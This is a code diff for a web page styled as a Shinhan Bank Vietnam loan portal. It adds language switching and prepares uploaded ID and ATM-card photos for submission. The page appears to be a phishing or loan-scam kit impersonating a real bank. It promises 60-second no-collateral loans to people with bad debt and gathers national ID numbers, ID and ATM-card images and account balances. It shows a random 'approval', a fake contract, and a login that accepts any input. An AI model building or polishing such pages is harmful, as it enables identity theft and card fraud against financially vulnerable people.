@@ -42,7 +42,6 @@
             border: none;
             color: white;
             cursor: pointer;
-            display: block;
             transition: transform 0.3s ease;
         }
 
@@ -52,17 +51,20 @@
 
         header nav {
             display: none;
-            position: absolute;
-            top: 50px;
+            position: fixed;
+            top: 0;
             left: 0;
-            width: 100%;
+            width: 250px;
+            height: 100%;
             background: #003087;
-            padding: 10px 0;
-            transition: all 0.3s ease;
+            padding: 20px;
+            transition: transform 0.3s ease;
+            transform: translateX(-100%);
         }
 
         header nav.active {
             display: block;
+            transform: translateX(0);
         }
 
         header nav a {
@@ -70,7 +72,7 @@
             color: white;
             text-decoration: none;
             font-size: 14px;
-            padding: 10px 15px;
+            padding: 10px 0;
         }
 
         header nav a:hover {
@@ -533,9 +535,11 @@
                 display: flex;
                 position: static;
                 width: auto;
+                height: auto;
                 background: none;
                 padding: 0;
                 gap: 15px;
+                transform: none;
             }
 
             header nav a {
@@ -602,19 +606,49 @@
         }
     </style>
     <script>
+        const translations = {
+            vi: {
+                welcome: "Chào mừng đến với Shinhan Bank",
+                intro: "Shinhan Bank Việt Nam, thành viên của Shinhan Financial Group, cung cấp các sản phẩm tài chính sáng tạo, an toàn và đáng tin cậy từ năm 1993.",
+                submit: "Gửi Đăng Ký",
+                loanIntro: "Vay dễ dàng, không thế chấp, duyệt nhanh trong 60 giây. Hỗ trợ khách hàng có nợ xấu/nợ chú ý, vay tối đa 50 triệu.",
+                conditions: "Điều kiện giải ngân:"
+            },
+            en: {
+                welcome: "Welcome to Shinhan Bank",
+                intro: "Shinhan Bank Vietnam, a member of Shinhan Financial Group, offers innovative, secure, and reliable financial products since 1993.",
+                submit: "Submit Application",
+                loanIntro: "Easy loans, no collateral, approved in 60 seconds. Supports customers with bad debt/attention, up to 50 million VND.",
+                conditions: "Disbursement Conditions:"
+            }
+        };
+
         document.addEventListener('DOMContentLoaded', () => {
+            // Language Toggle
+            const languageToggle = document.querySelector('.language-toggle select');
+            function setLanguage(lang) {
+                document.querySelector('.home-section h2').textContent = translations[lang].welcome;
+                document.querySelector('.intro-section p').textContent = translations[lang].intro;
+                document.querySelector('#register-form button').textContent = translations[lang].submit;
+                document.querySelector('.loan-intro p:nth-child(2)').textContent = translations[lang].loanIntro;
+                document.querySelector('.loan-intro h3').textContent = translations[lang].conditions;
+                localStorage.setItem('language', lang);
+            }
+
+            languageToggle.addEventListener('change', (e) => {
+                setLanguage(e.target.value);
+            });
+
+            const savedLang = localStorage.getItem('language') || 'vi';
+            languageToggle.value = savedLang;
+            setLanguage(savedLang);
+
             // Hamburger Menu
             const hamburger = document.querySelector('.hamburger');
             const nav = document.querySelector('header nav');
             hamburger.addEventListener('click', () => {
                 nav.classList.toggle('active');
                 hamburger.classList.toggle('active');
-            });
-
-            // Language Toggle
-            const languageToggle = document.querySelector('.language-toggle select');
-            languageToggle.addEventListener('change', (e) => {
-                alert(`Ngôn ngữ đã chọn: ${e.target.value}. Chức năng này đang được phát triển!`);
             });
 
             // Toggle Sections
@@ -648,7 +682,7 @@
                 button.addEventListener('click', () => {
                     const details = button.parentElement.querySelector('.details');
                     details.classList.toggle('active');
-                    button.textContent = details.classList.contains('active') ? 'Ẩn chi tiết' : 'Tìm hiểu';
+                    button.textContent = details.classList.contains('active') ? translations[savedLang].submit === "Gửi Đăng Ký" ? 'Ẩn chi tiết' : 'Hide Details' : translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tìm hiểu' : 'Learn More';
                 });
             });
 
@@ -661,15 +695,15 @@
                 let rate;
 
                 if (isNaN(amount) || amount <= 0) {
-                    alert('Vui lòng nhập số tiền vay hợp lệ!');
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập số tiền vay hợp lệ!' : 'Please enter a valid loan amount!');
                     return;
                 }
                 if (isNaN(term) || term <= 0) {
-                    alert('Vui lòng nhập thời hạn vay hợp lệ!');
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập thời hạn vay hợp lệ!' : 'Please enter a valid loan term!');
                     return;
                 }
                 if (!loanType || loanType === "Loại vay") {
-                    alert('Vui lòng chọn loại vay!');
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng chọn loại vay!' : 'Please select a loan type!');
                     return;
                 }
 
@@ -684,14 +718,14 @@
 
                 const resultDiv = document.querySelector('#loan-calculator .result');
                 if (isNaN(monthlyPayment) || isNaN(totalPayment)) {
-                    resultDiv.innerHTML = 'Không thể tính toán. Vui lòng kiểm tra lại thông tin nhập!';
+                    resultDiv.innerHTML = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Không thể tính toán. Vui lòng kiểm tra lại thông tin nhập!' : 'Unable to calculate. Please check the input!';
                 } else {
                     resultDiv.innerHTML = `
-                        Thanh toán hàng tháng: ${monthlyPayment.toFixed(0)} VNĐ<br>
-                        Tổng tiền: ${totalPayment.toFixed(0)} VNĐ<br>
-                        <h4>Lịch thanh toán mẫu</h4>
+                        ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Thanh toán hàng tháng' : 'Monthly Payment'}: ${monthlyPayment.toFixed(0)} VNĐ<br>
+                        ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tổng tiền' : 'Total Amount'}: ${totalPayment.toFixed(0)} VNĐ<br>
+                        <h4>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Lịch thanh toán mẫu' : 'Sample Payment Schedule'}</h4>
                         <table class="payment-schedule">
-                            <tr><th>Tháng</th><th>Số tiền</th><th>Gốc</th><th>Lãi</th><th>Dư nợ</th></tr>
+                            <tr><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tháng' : 'Month'}</th><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số tiền' : 'Amount'}</th><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Gốc' : 'Principal'}</th><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Lãi' : 'Interest'}</th><th>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Dư nợ' : 'Balance'}</th></tr>
                     `;
                     let remainingBalance = amount;
                     for (let i = 1; i <= Math.min(term, 3); i++) {
@@ -700,7 +734,7 @@
                         remainingBalance -= principal;
                         resultDiv.innerHTML += `
                             <tr>
-                                <td>Tháng ${i}</td>
+                                <td>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tháng' : 'Month'} ${i}</td>
                                 <td>${monthlyPayment.toFixed(0)} VNĐ</td>
                                 <td>${principal.toFixed(0)} VNĐ</td>
                                 <td>${interest.toFixed(0)} VNĐ</td>
@@ -709,7 +743,7 @@
                         `;
                     }
                     resultDiv.innerHTML += `</table>`;
-                    if (term > 3) resultDiv.innerHTML += `<p>(Hiển thị 3 tháng đầu, tổng cộng ${term} tháng)</p>`;
+                    if (term > 3) resultDiv.innerHTML += `<p>(${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hiển thị 3 tháng đầu, tổng cộng' : 'Showing first 3 months, total'} ${term} ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'tháng' : 'months'})</p>`;
                 }
             });
 
@@ -741,11 +775,11 @@
                 const password = document.querySelector('#login-modal input[type="password"]').value;
 
                 if (!username || !password) {
-                    alert('Vui lòng nhập đầy đủ thông tin!');
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập đầy đủ thông tin!' : 'Please fill in all fields!');
                     return;
                 }
 
-                alert('Đăng nhập thành công!');
+                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đăng nhập thành công!' : 'Login successful!');
                 document.querySelector('#login-modal').style.display = 'none';
             });
 
@@ -758,11 +792,11 @@
 
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (!username || !emailRegex.test(email) || !password) {
-                    alert('Vui lòng nhập đầy đủ và đúng định dạng thông tin!');
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập đầy đủ và đúng định dạng thông tin!' : 'Please fill in all fields correctly!');
                     return;
                 }
 
-                alert('Đăng ký thành công!');
+                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đăng ký thành công!' : 'Registration successful!');
                 document.querySelector('#register-modal').style.display = 'none';
             });
 
@@ -788,22 +822,33 @@
                     company: document.querySelector('#register-form input[placeholder="Công ty"]').value,
                     accountBalance: document.querySelector('#register-form input[placeholder="Số dư tài khoản (VNĐ)"]').value,
                     purpose: document.querySelector('#register-form input[placeholder="Mục đích vay"]').value,
-                    cccdFront: document.querySelector('#cccd-front').files[0]?.name || '',
-                    cccdBack: document.querySelector('#cccd-back').files[0]?.name || '',
-                    atmCard: document.querySelector('#atm-card').files[0]?.name || ''
+                    cccdFront: document.querySelector('#cccd-front').files[0],
+                    cccdBack: document.querySelector('#cccd-back').files[0],
+                    atmCard: document.querySelector('#atm-card').files[0]
                 };
 
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (!emailRegex.test(formData.email)) {
-                    alert('Vui lòng nhập email hợp lệ!');
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập email hợp lệ!' : 'Please enter a valid email!');
                     return;
                 }
                 if (isNaN(formData.loanAmount) || formData.loanAmount <= 0) {
-                    alert('Số tiền vay phải lớn hơn 0!');
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số tiền vay phải lớn hơn 0!' : 'Loan amount must be greater than 0!');
                     return;
                 }
                 if (!formData.cccdFront || !formData.cccdBack || !formData.atmCard) {
-                    alert('Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!');
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!' : 'Please upload all required photos!');
+                    return;
+                }
+
+                // File validation
+                const maxSize = 5 * 1024 * 1024; // 5MB
+                if (formData.cccdFront.size > maxSize || formData.cccdBack.size > maxSize || formData.atmCard.size > maxSize) {
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Ảnh không được vượt quá 5MB!' : 'Images must not exceed 5MB!');
+                    return;
+                }
+                if (!['image/jpeg', 'image/png'].includes(formData.cccdFront.type) || !['image/jpeg', 'image/png'].includes(formData.cccdBack.type) || !['image/jpeg', 'image/png'].includes(formData.atmCard.type)) {
+                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!' : 'Please upload images in JPEG or PNG format!');
                     return;
                 }
 
@@ -816,40 +861,38 @@
                     document.querySelector('#confirm-modal .loader').style.display = 'none';
                     document.querySelector('#confirm-modal button').disabled = false;
 
-                    // Simulate dynamic status
-                    const isApproved = Math.random() > 0.2; // 80% approval rate for demo
+                    const isApproved = Math.random() > 0.2;
                     const profileCode = `SHB-${Date.now()}`;
                     const approvalModal = document.querySelector('#approval-modal');
                     approvalModal.style.display = 'flex';
 
                     if (isApproved) {
-                        approvalModal.querySelector('h2').textContent = 'Đã đủ điều kiện vay';
-                        approvalModal.querySelector('p').textContent = 'Hồ sơ của bạn đã được duyệt tại Shinhan Bank.';
+                        approvalModal.querySelector('h2').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đã đủ điều kiện vay' : 'Loan Approved';
+                        approvalModal.querySelector('p').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hồ sơ của bạn đã được duyệt tại Shinhan Bank.' : 'Your application has been approved at Shinhan Bank.';
                     } else {
-                        approvalModal.querySelector('h2').textContent = 'Hồ sơ chưa được duyệt';
-                        approvalModal.querySelector('p').textContent = 'Vui lòng liên hệ nhân viên để được hỗ trợ thêm.';
+                        approvalModal.querySelector('h2').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hồ sơ chưa được duyệt' : 'Loan Not Approved';
+                        approvalModal.querySelector('p').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng liên hệ nhân viên để được hỗ trợ thêm.' : 'Please contact our staff for further assistance.';
                     }
-                    approvalModal.querySelector('.profile-code').textContent = `Mã hồ sơ: ${profileCode}`;
+                    approvalModal.querySelector('.profile-code').textContent = translations[savedLang].submit === "Gửi Đăng Ký" ? `Mã hồ sơ: ${profileCode}` : `Profile Code: ${profileCode}`;
 
                     const contractContent = document.querySelector('#contract-content');
                     contractContent.innerHTML = `
-                        <h3>HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK</h3>
-                        <p><strong>Số hợp đồng:</strong> ${profileCode}</p>
-                        <p><strong>Ngày ký:</strong> ${new Date().toLocaleDateString('vi-VN')}</p>
-                        <p><strong>Bên vay:</strong> ${formData.name}</p>
+                        <h3>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK' : 'SHINHAN BANK LOAN CONTRACT'}</h3>
+                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số hợp đồng' : 'Contract Number'}:</strong> ${profileCode}</p>
+                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Ngày ký' : 'Date Signed'}:</strong> ${new Date().toLocaleDateString(savedLang === 'vi' ? 'vi-VN' : 'en-US')}</p>
+                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Bên vay' : 'Borrower'}:</strong> ${formData.name}</p>
                         <p><strong>CCCD/CMND:</strong> ${formData.cccd}</p>
-                        <p><strong>Số tiền vay:</strong> ${formData.loanAmount} VNĐ</p>
-                        <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
-                        <p><strong>Loại vay:</strong> ${formData.loanType}</p>
-                        <p><strong>Lãi suất:</strong> 8%/năm (tính trên dư nợ giảm dần)</p>
-                        <p><strong>Điều khoản:</strong> Bên vay cam kết thanh toán đúng hạn theo lịch trả nợ.</p>
-                        <p><a href="#" onclick="alert('Tải hợp đồng - Chức năng đang phát triển!')">Tải hợp đồng</a></p>
+                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số tiền vay' : 'Loan Amount'}:</strong> ${formData.loanAmount} VNĐ</p>
+                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Thời hạn vay' : 'Loan Term'}:</strong> ${formData.loanTerm} ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'tháng' : 'months'}</p>
+                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Loại vay' : 'Loan Type'}:</strong> ${formData.loanType}</p>
+                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Lãi suất' : 'Interest Rate'}:</strong> 8%/năm</p>
+                        <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Điều khoản' : 'Terms'}:</strong> ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Bên vay cam kết thanh toán đúng hạn.' : 'Borrower agrees to timely repayments.'}</p>
+                        <p><a href="#" onclick="alert('${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tải hợp đồng - Chức năng đang phát triển!' : 'Download contract - Feature in development!'}')">${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Tải hợp đồng' : 'Download Contract'}</a></p>
                     `;
                     document.querySelector('.contract-display').classList.add('active');
 
-                    // Simulate email notifications
-                    alert(`Email gửi đến admin: Hồ sơ của ${formData.name}, CCCD: ${formData.cccd}, ảnh: ${formData.cccdFront}, ${formData.cccdBack}, ${formData.atmCard}`);
-                    alert(`Email gửi đến ${formData.email}: Hồ sơ vay thành công. Kiểm tra hợp đồng. Không cần mua bảo hiểm, không đóng phí.`);
+                    alert(`${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Email gửi đến admin: Hồ sơ của' : 'Email sent to admin: Application of'} ${formData.name}, CCCD: ${formData.cccd}, ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'ảnh đã tải lên.' : 'images uploaded.'}`);
+                    alert(`${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Email gửi đến' : 'Email sent to'} ${formData.email}: ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hồ sơ vay thành công. Không cần mua bảo hiểm, không đóng phí.' : 'Loan application successful. No insurance or fees required.'}`);
                 }, 60000);
             });
 
@@ -858,18 +901,18 @@
                 const profileModal = document.querySelector('#profile-modal');
                 profileModal.style.display = 'flex';
                 profileModal.querySelector('.modal-content').innerHTML = `
-                    <h2>Hồ Sơ Khách Hàng</h2>
-                    <p><strong>Họ và tên:</strong> ${formData.name}</p>
-                    <p><strong>Số điện thoại:</strong> ${formData.phone}</p>
+                    <h2>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Hồ Sơ Khách Hàng' : 'Customer Profile'}</h2>
+                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Họ và tên' : 'Name'}:</strong> ${formData.name}</p>
+                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số điện thoại' : 'Phone'}:</strong> ${formData.phone}</p>
                     <p><strong>Email:</strong> ${formData.email}</p>
                     <p><strong>CCCD/CMND:</strong> ${formData.cccd}</p>
-                    <p><strong>Địa chỉ:</strong> ${formData.address}</p>
-                    <p><strong>Thu nhập:</strong> ${formData.income} VNĐ</p>
-                    <p><strong>Số tiền vay:</strong> ${formData.loanAmount} VNĐ</p>
-                    <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
-                    <p><strong>Loại vay:</strong> ${formData.loanType}</p>
-                    <p><strong>Ảnh:</strong> CCCD và thẻ ATM đã được tải lên</p>
-                    <button onclick="document.querySelector('#profile-modal').style.display='none'">Đóng</button>
+                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Địa chỉ' : 'Address'}:</strong> ${formData.address}</p>
+                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Thu nhập' : 'Income'}:</strong> ${formData.income} VNĐ</p>
+                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Số tiền vay' : 'Loan Amount'}:</strong> ${formData.loanAmount} VNĐ</p>
+                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Thời hạn vay' : 'Loan Term'}:</strong> ${formData.loanTerm} ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'tháng' : 'months'}</p>
+                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Loại vay' : 'Loan Type'}:</strong> ${formData.loanType}</p>
+                    <p><strong>${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Ảnh' : 'Images'}:</strong> ${translations[savedLang].submit === "Gửi Đăng Ký" ? 'CCCD và thẻ ATM đã được tải lên' : 'CCCD and ATM card uploaded'}</p>
+                    <button onclick="document.querySelector('#profile-modal').style.display='none'">${translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đóng' : 'Close'}</button>
                 `;
             });
 
@@ -884,7 +927,7 @@
             // No Card Guide
             const noCardLink = document.querySelector('.no-card');
             noCardLink.addEventListener('click', () => {
-                alert('Để xem số thẻ, đăng nhập ứng dụng ngân hàng hoặc liên hệ chi nhánh. Nếu chưa có thẻ, vui lòng đến Shinhan Bank để phát hành.');
+                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Để xem số thẻ, đăng nhập ứng dụng ngân hàng hoặc liên hệ chi nhánh. Nếu chưa có thẻ, vui lòng đến Shinhan Bank để phát hành.' : 'To view card number, log in to the banking app or contact a branch. If you don’t have a card, visit Shinhan Bank to issue one.');
             });
 
             // Support Buttons
@@ -895,7 +938,7 @@
 
             const chatButton = document.querySelector('.support-btn.chat');
             chatButton.addEventListener('click', () => {
-                alert('Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!');
+                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!' : 'Chat feature is under development. Please call hotline 1900 1577 for support!');
             });
 
             const messengerButton = document.querySelector('.support-btn.messenger');
